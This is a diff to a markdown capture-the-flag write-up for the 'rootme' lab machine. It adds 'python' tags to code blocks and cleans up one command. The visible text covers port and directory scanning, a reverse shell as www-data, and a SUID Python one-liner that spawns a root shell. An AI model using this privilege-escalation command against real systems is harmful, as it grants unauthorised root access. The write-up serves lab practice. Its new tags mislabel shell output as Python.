@@ -17,7 +17,7 @@ rustscan $IP -- -A -sC -sV -oN nmap.txt
 
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -158,7 +158,7 @@ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3
 
 ````````
 
-````````
+````````python
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -216,7 +216,7 @@ Now, we wll run it and get our reverseshell....
 
 ## Getting user.txt
 
-````````
+````````python
 (remote) www-data@rootme:/$ cd var/www/html/
 (remote) www-data@rootme:/var/www/html$ ls
 Website.zip  css  index.php  js  panel	uploads
@@ -232,10 +232,10 @@ Website.zip  css  index.php  js  panel	uploads
 - SUID :- /usr/bin/python
 
 ````````
-(remote) www-data@rootme:/tmp$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ````````
 
-````````
+````````python
 \[\](remote)\[\] \[\]root@rootme\[\]:\[\]/tmp\[\]$ cd /root	
 \[\](remote)\[\] \[\]root@rootme\[\]:\[\]/root\[\]$ ls
 root.txt
